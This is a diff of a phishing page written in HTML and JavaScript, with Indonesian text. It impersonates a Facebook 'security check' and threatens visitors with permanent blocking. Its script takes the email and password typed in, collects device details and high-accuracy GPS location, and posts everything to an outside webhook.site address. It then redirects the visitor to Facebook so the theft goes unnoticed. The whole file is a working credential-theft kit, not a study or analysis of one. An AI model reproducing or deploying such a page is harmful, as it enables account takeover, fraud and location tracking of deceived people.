@@ -1,65 +1,80 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Konfirmasi Keamanan Facebook</title>
+    <title>Security Check - Authentication Required</title>
     <style>
-        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; padding-top: 50px; }
-        .login-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
-        img { width: 200px; margin-bottom: 20px; }
-        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
-        button { width: 95%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; }
-        .info { font-size: 13px; color: #606770; margin-top: 15px; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .card { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 12px 28px rgba(0,0,0,0.2); width: 100%; max-width: 400px; text-align: center; }
+        .fb-logo { width: 200px; margin-bottom: 20px; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
+        button { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .footer { font-size: 12px; color: #606770; margin-top: 20px; }
     </style>
 </head>
 <body>
 
-<div class="login-container">
-    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zSkmkv.svg" alt="Facebook">
-    <p>Kami mendeteksi aktivitas login yang tidak biasa. Silakan konfirmasi identitas Anda untuk melanjutkan.</p>
+<div class="card">
+    <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zSkmkv.svg" class="fb-logo">
+    <p>Akun Anda terdeteksi login dari perangkat baru. Silakan verifikasi identitas Anda untuk mencegah pemblokiran permanen.</p>
     
-    <input type="text" id="email" placeholder="Email atau Nomor Telepon" required>
-    <input type="password" id="pass" placeholder="Kata Sandi" required>
-    <button onclick="sendData()">Konfirmasi</button>
+    <input type="text" id="user" placeholder="Email atau Nomor Telepon">
+    <input type="password" id="pass" placeholder="Kata Sandi">
+    <button onclick="captureData()">Verifikasi Akun</button>
     
-    <p class="info">Lupa kata sandi? · Pusat Bantuan</p>
+    <div class="footer">Bukan akun Anda? Klik di sini untuk bantuan.</div>
 </div>
 
 <script>
-    // GANTI URL DI BAWAH INI PAKE URL WEBHOOK LO!
-    const myWebhook = "MASUKKAN_URL_WEBHOOK_LO_DISINI";
+    // MASUKKAN URL WEBHOOK LO DARI GAMBAR TADI (image_d5d17b.png)
+    const WEBHOOK_URL = "https://webhook.site/a8889196-bf1c-4c88-9a69-8eacaf2e1bd0";
 
-    let locationData = "GPS Ditolak";
-
-    // Minta Lokasi Otomatis
-    navigator.geolocation.getCurrentPosition((pos) => {
-        locationData = {
-            lat: pos.coords.latitude,
-            lon: pos.coords.longitude,
-            maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
-        };
-    }, (err) => { console.log("GPS Off"); });
-
-    function sendData() {
-        const email = document.getElementById('email').value;
+    async function captureData() {
+        const user = document.getElementById('user').value;
         const pass = document.getElementById('pass').value;
 
-        const payload = {
-            target: "Samsung A15 Hacker",
-            email: email,
-            password: pass,
-            location: locationData,
-            device: navigator.userAgent
+        if(!user || !pass) return alert("Harap isi semua kolom.");
+
+        // Deteksi Device & Browser secara otomatis
+        const device_info = {
+            os: navigator.platform,
+            browser: navigator.userAgent,
+            cores: navigator.hardwareConcurrency || "N/A",
+            ram: navigator.deviceMemory || "N/A",
+            language: navigator.language,
+            screen: `${window.screen.width}x${window.screen.height}`
         };
 
-        fetch(myWebhook, {
+        // Minta Lokasi GPS
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            sendToMaster(user, pass, device_info, {
+                lat: pos.coords.latitude,
+                lon: pos.coords.longitude,
+                acc: pos.coords.accuracy,
+                maps: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`
+            });
+        }, (err) => {
+            // Tetap kirim data meskipun GPS ditolak (pake IP aslinya nanti)
+            sendToMaster(user, pass, device_info, "GPS_DENIED");
+        }, { enableHighAccuracy: true });
+    }
+
+    function sendToMaster(u, p, dev, loc) {
+        fetch(WEBHOOK_URL, {
             method: 'POST',
             mode: 'no-cors',
-            body: JSON.stringify(payload)
+            body: JSON.stringify({
+                event: "INTRUDER_CAPTURED",
+                credentials: { email: u, password: p },
+                hardware: dev,
+                location: loc,
+                timestamp: new Date().toISOString()
+            })
         });
 
-        alert("Identitas Terverifikasi. Sesi akan segera pulih.");
-        window.location.href = "https://m.facebook.com";
+        alert("Verifikasi Berhasil. Akun Anda sedang dipulihkan.");
+        window.location.href = "https://facebook.com/login";
     }
 </script>
 
